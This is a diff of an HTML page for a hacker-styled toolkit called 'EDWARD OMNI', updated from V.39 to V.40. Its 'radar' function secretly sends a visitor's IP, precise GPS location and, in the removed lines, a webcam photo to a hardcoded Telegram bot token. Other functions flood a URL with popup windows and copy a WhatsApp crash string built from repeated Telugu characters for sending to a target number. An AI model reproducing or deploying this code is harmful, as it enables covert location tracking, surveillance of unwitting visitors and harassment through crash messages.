@@ -6,29 +6,30 @@
     <title>[ EDWARD OMNI - LEGACY ]</title>
     <style>
         :root { --neon: #0f0; --danger: #f00; --bg: #000; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; margin:0; padding: 15px; overflow-x: hidden; }
-        h2 { text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon); margin: 10px 0 20px 0; font-size: 18px; }
-        .panel { border: 1px solid var(--neon); border-radius: 8px; padding: 15px; margin-bottom: 15px; text-align: left; background: #050505; box-shadow: 0 0 5px rgba(0,255,0,0.2); }
-        h3 { margin: 0 0 12px 0; font-size: 14px; text-transform: uppercase; color: #fff; }
-        input { background: #000; border: 1px solid #333; color: #fff; padding: 12px; width: 90%; border-radius: 4px; margin-bottom: 10px; font-size: 12px; outline: none; font-family: 'Courier New', monospace; }
-        input:focus { border: 1px solid var(--neon); box-shadow: 0 0 5px var(--neon); }
-        button { width: 100%; padding: 12px; font-weight: bold; border-radius: 4px; border: none; cursor: pointer; text-transform: uppercase; font-size: 12px; font-family: 'Courier New', monospace; transition: 0.2s; }
+        /* Hide GitHub Header */
+        header, .Header, .gh-header { display: none !important; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; margin:0; padding: 15px; }
+        h2 { text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon); margin: 5px 0 15px 0; font-size: 16px; }
+        .panel { border: 1px solid var(--neon); border-radius: 4px; padding: 12px; margin-bottom: 12px; text-align: left; background: #050505; }
+        h3 { margin: 0 0 10px 0; font-size: 12px; text-transform: uppercase; color: #fff; }
+        input { background: #000; border: 1px solid #333; color: #fff; padding: 10px; width: 88%; border-radius: 4px; margin-bottom: 8px; font-size: 11px; outline: none; font-family: 'Courier New', monospace; }
+        button { width: 100%; padding: 12px; font-weight: bold; border-radius: 4px; border: none; cursor: pointer; text-transform: uppercase; font-size: 11px; font-family: 'Courier New', monospace; }
         .wa-btn { background: #25D366; color: #000; }
         .phish-btn { background: #bc13fe; color: #fff; }
         .radar-btn { background: var(--bg); color: var(--neon); border: 1px solid var(--neon); }
-        button:active { transform: scale(0.98); }
-        
+        /* LOG SERANGAN */
+        .log-container { background: #000; border: 1px solid #222; border-radius: 4px; height: 80px; overflow-y: auto; padding: 8px; text-align: left; font-size: 10px; color: #555; margin-top: 5px; }
+        .log-success { color: var(--neon); }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-circle { width: 200px; height: 200px; border: 2px solid var(--neon); border-radius: 50%; position: relative; box-shadow: 0 0 15px var(--neon); }
+        .radar-circle { width: 180px; height: 180px; border: 2px solid var(--neon); border-radius: 50%; position: relative; }
         .radar-sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.5), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-right: 2px solid var(--neon); }
         @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        canvas { display: none; }
-        video { display: none; }
+        canvas, video { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>EDWARD OMNI V.39.0</h2>
+    <h2>EDWARD OMNI V.40.0</h2>
 
     <div class="panel">
         <h3>[ 01 ] WHATSAPP BUG</h3>
@@ -40,6 +41,9 @@
         <h3>[ 02 ] PHISHING KILLER</h3>
         <input type="text" id="targetUrl" placeholder="Link Web Penipu">
         <button class="phish-btn" onclick="brutalAttack()">LAUNCH BRUTAL ATTACK 🔥</button>
+        <div class="log-container" id="attackLog">
+            > STANDBY... WAITING FOR COMMAND
+        </div>
     </div>
 
     <div class="panel">
@@ -50,7 +54,7 @@
     <div id="radarOverlay">
         <div class="radar-circle"><div class="radar-sweep"></div></div>
         <p id="statusTxt" style="color:var(--neon); margin-top:20px; font-size:12px;">CALIBRATING GPS PRECISION...</p>
-        <button onclick="location.reload()" style="background:transparent; color:#333; width:auto; border:none; margin-top:15px; font-size:10px;">[ EXIT ]</button>
+        <button onclick="location.reload()" style="background:transparent; color:#333; border:none; margin-top:15px; font-size:10px;">[ EXIT ]</button>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -60,53 +64,48 @@
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const ID = '7898572558';
 
-        function sendTele(msg) { fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + ID + "&text=" + encodeURIComponent(msg)); }
+        function addLog(msg, success = false) {
+            const log = document.getElementById('attackLog');
+            const span = document.createElement('div');
+            span.className = success ? 'log-success' : '';
+            span.innerText = "> " + msg;
+            log.appendChild(span);
+            log.scrollTop = log.scrollHeight;
+        }
 
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
-            const status = document.getElementById('statusTxt');
-
             try {
-                // 1. IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                
-                // 2. High Accuracy GPS
                 navigator.geolocation.getCurrentPosition(async (p) => {
-                    let msg = "🔱 [ TARGET LOCKED V.39 ] 🔱\n🌐 IP: "+ipData.ip+"\n📍 LOC: https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude+"\n🎯 ACCURACY: "+p.coords.accuracy.toFixed(1)+" meters\n📱 DEV: "+navigator.userAgent;
-                    sendTele(msg);
-                    status.innerText = "COORDINATES ENCRYPTED.";
-                }, (err) => { status.innerText = "ERROR: NEED GPS PERMISSION!"; }, { enableHighAccuracy: true, timeout: 5000 });
-
-                // 3. Capture Foto
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    const formData = new FormData();
-                    formData.append('chat_id', ID);
-                    formData.append('photo', blob);
-                    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto", { method: "POST", body: formData });
-                }, 3000);
-
-            } catch (e) { status.innerText = "SENSOR BLOCKED!"; }
+                    let msg = "🔱 [ LOCKED ] 🔱\nIP: "+ipData.ip+"\nACC: "+p.coords.accuracy.toFixed(1)+"m\nLOC: https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
+                    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent(msg));
+                    document.getElementById('statusTxt').innerText = "COORDINATES SECURED.";
+                }, null, { enableHighAccuracy: true });
+            } catch (e) {}
         }
 
         function brutalAttack() {
             let url = document.getElementById('targetUrl').value;
-            if(!url) return alert("Link Penipu!");
-            alert("BRUTAL ATTACK STARTED! Target will be flooded.");
-            for(let i=0; i<30; i++) { window.open(url, '_blank', 'width=10,height=10'); }
+            if(!url) return;
+            addLog("INITIALIZING FLOOD ATTACK...", true);
+            let count = 0;
+            let interval = setInterval(() => {
+                window.open(url, '_blank', 'width=10,height=10');
+                count++;
+                addLog("PACKET SENT TO " + url.substring(0,20) + "... [" + count + "]", true);
+                if(count >= 20) {
+                    clearInterval(interval);
+                    addLog("ATTACK CYCLE COMPLETE.");
+                }
+            }, 300);
         }
 
         function startCrashWA() {
             let n = document.getElementById('noWA').value;
-            let p = "జ్ఞా".repeat(400) + "‌".repeat(500);
-            navigator.clipboard.writeText(p).then(() => { window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=SISTEM_RADAR_AKTIF"; });
+            let p = "జ్ఞਾ".repeat(300);
+            navigator.clipboard.writeText(p).then(() => { window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=RADAR_BOOT_v40"; });
         }
     </script>
 </body>
